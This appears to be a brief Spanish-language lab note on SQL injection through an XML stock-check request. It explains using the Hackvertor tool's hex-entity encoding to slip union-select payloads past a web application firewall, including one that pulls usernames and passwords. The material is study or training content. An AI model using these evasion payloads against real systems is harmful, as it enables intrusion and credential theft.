- Tags : #sql #sqlinjection #sqlinjection_blind

En este tipo de ataque intentamos bypasear con ayuda del hackvetor las estructuras xml para que que no sean detectados los ataque por los waf.
Podemos transformar el código sql como base64 , hexadecimal entre otras opciones que tiene el hackvertor

Siempre probamos los primeros casos para ver si es vulnerable a SQLI order by 1 , para saber cant de columnas y las clásicas union select

en este caso en particular 


```xml
<stockCheck>
    <productId>1</productId>
    <storeId>
        1 union select 1
    </storeId>
</stockCheck>

Despues de con hackvertor transformar a hexadecimal
	<storeId>
        1 union select 1
    </storeId>

<stockCheck>
    <productId>1</productId>
    <storeId>
        <z@hex_entities>
	        1 union select 1
        </@hex_entities>
    </storeId>
</stockCheck>
```

Probaríamos a continuación si nos muestra datos , tener en cuenta que debemos ver el tipo de BD que es.

```xml
<stockCheck>
    <productId>1</productId>
    <storeId>
        <z@hex_entities>
	        1 union select 'test'
        </@hex_entities>
    </storeId>
</stockCheck>

Al ver que nos muestra los datos pues solicitamos datos con una consulta como por ejemplo

<stockCheck>
    <productId>1</productId>
    <storeId>
        <z@hex_entities>
	        1 union select username||':'||password from username
        </@hex_entities>
    </storeId>
</stockCheck>
```
En este caso particular no  ponemos ' -- -

Porque este SQLI atiende a un caso particular que es cuando hacemos una solicitud

```
SELECT USERNAME FROM USER WHERE ID=1

Tambien es correcto 

SELECT USERNAME FROM USER WHERE ID='1' en este caso si se pondria ' --

por lo que no es necsario para nada cerrar o interrumpir la estrunctura de sql poniendo '
```